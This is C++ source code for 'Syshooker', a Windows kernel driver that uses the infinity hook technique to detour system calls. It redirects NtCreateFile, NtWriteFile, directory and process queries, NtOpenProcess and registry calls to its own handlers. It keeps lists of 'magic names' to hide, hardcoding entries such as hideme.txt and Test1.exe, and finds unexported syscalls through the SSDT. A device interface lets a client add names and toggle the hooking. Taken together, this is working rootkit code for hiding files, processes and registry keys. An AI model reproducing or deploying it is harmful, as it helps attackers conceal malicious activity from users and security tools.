/*
*	Module Name:
*		entry.cpp
*
*	Abstract:
*		Sample driver that implements infinity hook to detour
*		system calls.
*
*	Authors:
*		Nick Peterson <everdox@gmail.com> | http://everdox.net/
*
*	Special thanks to Nemanja (Nemi) Mulasmajic <nm@triplefault.io>
*	for his help with the POC.
*
*/

#include "stdafx.h"
#include "entry.h"
#include "infinityhook.h"
#include "ssdt.h"
#include "../Syshooker-Client/SyshookerCommon.h"
#include "Settings.h"
#include "utils.h"

// old settings - delete
SyshookerSettings Settings = {
	L"xxxxx",		// NtCreateFileMagicName
	L"wassup",		// NtWriteFileMagicName
	L"hideme",		// NtQueryDirectoryFileExMagicName
	L"hideme.exe",	// NtQuerySystemInformationProcessMagicName
	L"hideme",		// RegistryKeyMagicName
};

// new settings - empty linked lists by default
SyshookerSettingsNew SettingsNew = {
	nullptr, // FileMagicNamesHead
	nullptr, // ProcessMagicNamesHead
	nullptr  // RegistryMagicNamesHead
};

// Hooked Syscalls
#include "NtCreateFile.h"
#include "NtWriteFile.h"
#include "NtQueryDirectoryFile.h"
#include "NtQueryDirectoryFileEx.h"
#include "NtOpenProcess.h"
#include "NtQuerySystemInformation.h"
#include "NtOpenKey.h"
#include "NtOpenKeyEx.h"
#include "NtQueryKey.h"
#include "NtEnumerateKey.h"

UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Syshooker");

NTSTATUS SyshookerCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS SyshookerWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS SyshookerRead(PDEVICE_OBJECT DeviceObject, PIRP Irp);

char CALLBACK_OVERWRITE_ENABLED = 0;

/*
*	The entry point of the driver. Initializes infinity hook and
*	sets up the driver's unload routine so that it can be gracefully 
*	turned off.
*/
extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	//UNREFERENCED_PARAMETER(RegistryPath);

	// TODO - remove this hardcoded process hide name
	NameNode* ProcessHead = CreateNameNode(L"Test1.exe", 9);
	NameNode* FileHead = CreateNameNode(L"hideme.txt", 10);
	SettingsNew.ProcessMagicNamesHead = ProcessHead;
	SettingsNew.FileMagicNamesHead = FileHead;
	// add another file
	FileHead = CreateNameNode(L"tajnysubor.txt", 14);
	SettingsNew.FileMagicNamesHead->Next = FileHead;

	// IRP Routines
	DriverObject->MajorFunction[IRP_MJ_CREATE] = SyshookerCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = SyshookerCreateClose;
	DriverObject->MajorFunction[IRP_MJ_WRITE] = SyshookerWrite;
	DriverObject->MajorFunction[IRP_MJ_READ] = SyshookerRead;

	// Device name
	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\Syshooker");

	// create Device Object
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create device object (0x%08X)\n", status));
		return status;
	}
	//kprintf("[+] syshooker DeviceObject address: %p\n", DeviceObject);
	//kprintf("[+] syshooker DriverUnload address: %p\n", DriverUnload);
	
	status = IoCreateSymbolicLink(&symLink, &deviceName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create symbolic link (0x%08X)\n", status));

		// need to free DeviceObject to clean up!!!
		IoDeleteDevice(DeviceObject);
		return status;
	}

	//
	// Figure out when we built this last for debugging purposes.
	//
	kprintf("[+] infinityhook: Loaded.\n");
	
	//
	// Let the driver be unloaded gracefully. This also turns off 
	// infinity hook.
	//
	DriverObject->DriverUnload = DriverUnload;

	// HERE: find the address of a real syscall
	// Find the original address of NtCreateFile.
	OriginalNtCreateFile = (NtCreateFile_t)MmGetSystemRoutineAddress(&StringNtCreateFile);
	if (!OriginalNtCreateFile)
	{
		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtCreateFile);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	// Find the original address of NtWriteFile
	OriginalNtWriteFile = (NtWriteFile_t)MmGetSystemRoutineAddress(&StringNtWriteFile);
	if (!OriginalNtWriteFile)
	{
		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtWriteFile);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	// Find the original address of NtQueryDirectoryFile
	OriginalNtQueryDirectoryFile = (NtQueryDirectoryFile_t)MmGetSystemRoutineAddress(&StringNtQueryDirectoryFile);
	if (!OriginalNtQueryDirectoryFile)
	{
		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtQueryDirectoryFile);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	// Find the original address of NtQueryDirectoryFileEx
	OriginalNtQueryDirectoryFileEx = (NtQueryDirectoryFileEx_t)MmGetSystemRoutineAddress(&StringNtQueryDirectoryFileEx);
	if (!OriginalNtQueryDirectoryFileEx)
	{
		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtQueryDirectoryFileEx);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	// Find the original address of NtOpenProcess
	OriginalNtOpenProcess = (NtOpenProcess_t)MmGetSystemRoutineAddress(&StringNtOpenProcess);
	if (!OriginalNtOpenProcess)
	{
		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtOpenProcess);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	OriginalNtQuerySystemInformation = (NtQuerySystemInformation_t)MmGetSystemRoutineAddress(&StringNtQuerySystemInformation);
	if (!OriginalNtQuerySystemInformation)
	{
		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtQuerySystemInformation);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}


	// for the syscalls that are not exported, we cannot use MmGetSystemRoutineAddress
	// - we need to resolve their address from SSDT

	const void* SsdtAddress = GetSsdtAddress();
	if (!SsdtAddress) {
		kprintf("[-] infinityhook: SSDT pattern not found.\n");
	}
	else {
		kprintf("[+] infinityhook: SSDT address: %p\n", SsdtAddress);
	}

	// NtOpenKey
	OriginalNtOpenKey = (NtOpenKey_t)GetSyscallAddress(INDEX_NTOPENKEY, (PCHAR)SsdtAddress);
	if (!OriginalNtOpenKey) {
		kprintf("[-] infinityhook: Failed to locate the address of: %wZ.\n", StringNtOpenKey);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}
	else kprintf("[+] infinityhook: NtOpenKey address: %p.\n", OriginalNtOpenKey);

	// NtQueryKey
	OriginalNtQueryKey = (NtQueryKey_t)GetSyscallAddress(INDEX_NTQUERYKEY, (PCHAR)SsdtAddress);
	if (!OriginalNtQueryKey) {
		kprintf("[-] infinityhook: Failed to locate the address of: %wZ.\n", StringNtQueryKey);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}
	else kprintf("[+] infinityhook: NtQueryKey address: %p.\n", OriginalNtQueryKey);

	// NtEnumerateKey
	OriginalNtEnumerateKey = (NtEnumerateKey_t)GetSyscallAddress(INDEX_NTENUMERATEKEY, (PCHAR)SsdtAddress);
	if (!OriginalNtEnumerateKey) {
		kprintf("[-] infinityhook: Failed to locate the address of: %wZ.\n", StringNtEnumerateKey);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}
	else kprintf("[+] infinityhook: NtEnumerateKey address: %p.\n", OriginalNtEnumerateKey);

	// NtOpenKeyEx
	OriginalNtOpenKeyEx = (NtOpenKeyEx_t)GetSyscallAddress(INDEX_NTOPENKEYEX, (PCHAR)SsdtAddress);
	if (!OriginalNtOpenKeyEx) {
		kprintf("[-] infinityhook: Failed to locate the address of: %wZ.\n", StringNtOpenKeyEx);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}
	else kprintf("[+] infinityhook: NtOpenKeyEx address: %p.\n", OriginalNtOpenKeyEx);

	// Try to find addresses of the registry-related syscalls
	// const void* NtOpenKeyAddr = GetSyscallAddress(INDEX_NTOPENKEY, (PCHAR)SsdtAddress);
	// kprintf("[+] infinityhook: NtOpenKey address: %p\n", NtOpenKeyAddr);

	/*const void* NtOpenKeyExAddr = GetSyscallAddress(INDEX_NTOPENKEYEX, (PCHAR)SsdtAddress);
	kprintf("[+] infinityhook: NtOpenKeyEx address: %p\n", NtOpenKeyExAddr);

	const void* NtQueryKeyAddr = GetSyscallAddress(INDEX_NTQUERYKEY, (PCHAR)SsdtAddress);
	kprintf("[+] infinityhook: NtQueryKey address: %p\n", NtQueryKeyAddr);

	const void* NtQueryValueKeyAddr = GetSyscallAddress(INDEX_NTQUERYVALUEKEY, (PCHAR)SsdtAddress);
	kprintf("[+] infinityhook: NtQueryValueKey address: %p\n", NtQueryValueKeyAddr);

	const void* NtQueryMultipleValueKeyAddr = GetSyscallAddress(INDEX_NTQUERYMULTIPLEVALUEKEY, (PCHAR)SsdtAddress);
	kprintf("[+] infinityhook: NtQueryMultipleValueKey address: %p\n", NtQueryMultipleValueKeyAddr);*/

	//
	// Initialize infinity hook. Each system call will be redirected
	// to our syscall stub.
	//
	NTSTATUS Status = IfhInitialize(SyscallCallback);
	if (!NT_SUCCESS(Status))
	{
		kprintf("[-] infinityhook: Failed to initialize with status: 0x%lx.\n", Status);
	}
	else
	{
		CALLBACK_OVERWRITE_ENABLED = 1; // TODO - uncomment here to start hooking
	}
	
	return Status;
}

/*
*	Turns off infinity hook.
*/
void DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
	kprintf("[!] infinityhook: Unload invoked...\n");
	UNREFERENCED_PARAMETER(DriverObject);

	CALLBACK_OVERWRITE_ENABLED = 0;

	//
	// Unload infinity hook gracefully.
	//
	IfhRelease();

	kprintf("[!] infinityhook: Unload - after IfhRelease...\n");

	// Release driver resources (symlink, device object)
	IoDeleteSymbolicLink(&symLink);
	kprintf("[!] infinityhook: Unload - after delete symbolic...\n");
	IoDeleteDevice(DriverObject->DeviceObject);

	kprintf("\n[!] infinityhook: Unloading... BYE!\n");
}

/*
*	For each usermode syscall, this stub will be invoked.
*/
void __fastcall SyscallCallback(
	_In_ unsigned int SystemCallIndex, 
	_Inout_ void** SystemCallFunction)
{
	// 
	// Enabling this message gives you VERY verbose logging... and slows
	// down the system. Use it only for debugging.
	//
	
#if 0
	kprintf("[+] infinityhook: SYSCALL %lu: 0x%p [stack: 0x%p].\n", SystemCallIndex, *SystemCallFunction, SystemCallFunction);
#endif

	UNREFERENCED_PARAMETER(SystemCallIndex);

	if (!CALLBACK_OVERWRITE_ENABLED) return;

	// HERE: overwrite the syscall address
	//
	// In our demo, we care only about nt!NtCreateFile calls.
	//
	if (*SystemCallFunction == OriginalNtCreateFile)
	{	
		//
		// We can overwrite the return address on the stack to our detoured
		// NtCreateFile.
		//
		*SystemCallFunction = DetourNtCreateFile;
	}

	// NtWriteFile
	if (*SystemCallFunction == OriginalNtWriteFile)
	{
		*SystemCallFunction = DetourNtWriteFile;
	}

	// NtQueryDirectoryFile
	if (*SystemCallFunction == OriginalNtQueryDirectoryFile)
	{
		*SystemCallFunction = DetourNtQueryDirectoryFile;
	}

	// NtQueryDirectoryFileEx
	if (*SystemCallFunction == OriginalNtQueryDirectoryFileEx)
	{
		*SystemCallFunction = DetourNtQueryDirectoryFileEx;
	}

	// NtOpenProcess
	if (*SystemCallFunction == OriginalNtOpenProcess)
	{
		*SystemCallFunction = DetourNtOpenProcess;
	}

	// NtQuerySystemInformation
	if (*SystemCallFunction == OriginalNtQuerySystemInformation)
	{
		*SystemCallFunction = DetourNtQuerySystemInformation;
	}

	//NtOpenKey
	if (*SystemCallFunction == OriginalNtOpenKey)
	{
		*SystemCallFunction = DetourNtOpenKey;
	}

	//NtQueryKey
	if (*SystemCallFunction == OriginalNtQueryKey)
	{
		*SystemCallFunction = DetourNtQueryKey;
	}

	//NtEnumerateKey
	if (*SystemCallFunction == OriginalNtEnumerateKey)
	{
		*SystemCallFunction = DetourNtEnumerateKey;
	}

	//NtOpenKeyEx
	if (*SystemCallFunction == OriginalNtOpenKeyEx)
	{
		*SystemCallFunction = DetourNtOpenKeyEx;
	}
}

NTSTATUS SyshookerCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS SyshookerWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	NTSTATUS status = STATUS_SUCCESS; // initially define status as success
	ULONG_PTR information = 0; // used bytes to return back to client

	// get stack location of IRP
	PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);

	do {
		if (irpSp->Parameters.Write.Length < sizeof(SyshookerApiWriteRequest)) {
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		// make data buffer accessible as SyshookerApiWriteRequest structure pointer
		SyshookerApiWriteRequest* request = static_cast<SyshookerApiWriteRequest*>(Irp->UserBuffer);

		// check buffer for nullptr and NameLength
		if (request == nullptr || request->NameLength <= 0) {
			//kprintf("[-] syshooker IRQ_WRITE: Request buffer (%p) or length invalid.\n", request);

			status = STATUS_INVALID_PARAMETER;
			break;
		}

		// print the buffer in kernel
		//kprintf("[+] syshooker IRQ_WRITE: NameBuffer: %ws.\n", request->NameBuffer);

		if (request->Operation == OPERATION_ADD) {
			NameNode* NewNameNode = CreateNameNode(request->NameBuffer, request->NameLength);
			if (NewNameNode == nullptr) {
				kprintf("[-] syshooker IRQ_WRITE: Failed to allocate newNameNode.\n");
				status = STATUS_INVALID_PARAMETER;
				break;
			}

			kprintf("[+] syshooker IRQ_WRITE: newNameNode: %ws.\n", NewNameNode->NameBuffer);

			status = appendNameNode(request->Target, NewNameNode);
			if (!NT_SUCCESS(status)) {
				kprintf("[-] syshooker IRQ_WRITE: Failed to append newNameNode.\n");
				FreeNameNode(NewNameNode);
				break;
			}
			else {
				kprintf("[+] syshooker IRQ_WRITE: newNameNode appended successfully.\n");
			}
		}
		else if (request->Operation == OPERATION_REMOVE) {
			// TODO
		}
		else if (request->Operation == OPERATION_TOGGLE) {
			kprintf("[+] syshooker IRQ_WRITE: Toggle overwrite.\n");
			CALLBACK_OVERWRITE_ENABLED = CALLBACK_OVERWRITE_ENABLED == 1 ? 0 : 1;
		}
		else {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		

		// return data used
		information = sizeof(*request);
	} while (FALSE);

	// complete IRP
	Irp->IoStatus.Status = status; // whatever status that is currently set
	Irp->IoStatus.Information = information;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS SyshookerRead(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	kprintf("[+] syshooker IRQ_READ called\n");
	UNREFERENCED_PARAMETER(DeviceObject);
	NTSTATUS status = STATUS_SUCCESS; // initially define status as success

	// get stack location of IRP
	PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
	size_t SettingsDumpSizeBytes = GetSettingsDumpSizeBytes();

	do {
		ULONG BufferSizeBytes = irpSp->Parameters.Read.Length;
		kprintf("[+] syshooker: %llu bytes required for settings dump.\n", SettingsDumpSizeBytes);

		if (BufferSizeBytes < SettingsDumpSizeBytes) {
			status = STATUS_BUFFER_TOO_SMALL;
			kprintf("[-] syshooker: Buffer too small (%lu). We need %llu bytes.\n", BufferSizeBytes, SettingsDumpSizeBytes);
			break;
		}

		// char buffer of the userspace data
		char* data = static_cast<char*>(Irp->UserBuffer);

		// check nullptr
		if (data == nullptr) {
			kprintf("[-] syshooker IRQ_READ: Data cannot be nullptr.\n");

			status = STATUS_INVALID_PARAMETER;
			break;
		}
		
		// first byte - current syshooker status
		*data = CALLBACK_OVERWRITE_ENABLED;
		
		// iterate over magicNames linked lists and populate the buffer with the names
		wchar_t* OutputBufferPtr = (wchar_t*)(data + 1);
		
		// files
		NameNode* CurrentNameNode = SettingsNew.FileMagicNamesHead;
		while (CurrentNameNode != nullptr) {
			if (CurrentNameNode->NameBuffer == nullptr) {
				kprintf("[-] syshooker: this should not have happened - NameBuffer is NULL.\n");
				status = STATUS_FAIL_CHECK;
				break;
			}
			size_t index = 0;
			while (CurrentNameNode->NameBuffer[index] != L'\0') { // we guarantee NULL-termination
				*OutputBufferPtr = CurrentNameNode->NameBuffer[index];
				OutputBufferPtr++;
				index++;
			}
			// add '\' or '\0' based on whether this is the last node or not
			*OutputBufferPtr = CurrentNameNode->Next != nullptr ? L'\\' : L'\0';
			OutputBufferPtr++;
			
			// move to the next NameNode
			CurrentNameNode = CurrentNameNode->Next;
		}
		if (!NT_SUCCESS(status)) break; // if the status is not success, don't continue
		

		// processes
		CurrentNameNode = SettingsNew.ProcessMagicNamesHead;
		while (CurrentNameNode != nullptr) {
			if (CurrentNameNode->NameBuffer == nullptr) {
				kprintf("[-] syshooker: this should not have happened - NameBuffer is NULL.\n");
				status = STATUS_FAIL_CHECK;
				break;
			}
			size_t index = 0;
			while (CurrentNameNode->NameBuffer[index] != L'\0') { // we guarantee NULL-termination
				*OutputBufferPtr = CurrentNameNode->NameBuffer[index];
				OutputBufferPtr++;
				index++;
			}
			// add '\' or '\0' based on whether this is the last node or not
			*OutputBufferPtr = CurrentNameNode->Next != nullptr ? L'\\' : L'\0';
			OutputBufferPtr++;

			// move to the next NameNode
			CurrentNameNode = CurrentNameNode->Next;
		}
		if (!NT_SUCCESS(status)) break; // if the status is not success, don't continue 
		
		// registry
		CurrentNameNode = SettingsNew.RegistryMagicNamesHead;
		while (CurrentNameNode != nullptr) {
			if (CurrentNameNode->NameBuffer == nullptr) {
				kprintf("[-] syshooker: this should not have happened - NameBuffer is NULL.\n");
				status = STATUS_FAIL_CHECK;
				break;
			}
			size_t index = 0;
			while (CurrentNameNode->NameBuffer[index] != L'\0') { // we guarantee NULL-termination
				*OutputBufferPtr = CurrentNameNode->NameBuffer[index];
				OutputBufferPtr++;
				index++;
			}
			// add '\' or '\0' based on whether this is the last node or not
			*OutputBufferPtr = CurrentNameNode->Next != nullptr ? L'\\' : L'\0';
			OutputBufferPtr++;

			// move to the next NameNode
			CurrentNameNode = CurrentNameNode->Next;
		}
		if (!NT_SUCCESS(status)) break;

	} while (FALSE);

	// complete IRP
	Irp->IoStatus.Status = status; // whatever status that is currently set
	Irp->IoStatus.Information = SettingsDumpSizeBytes;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}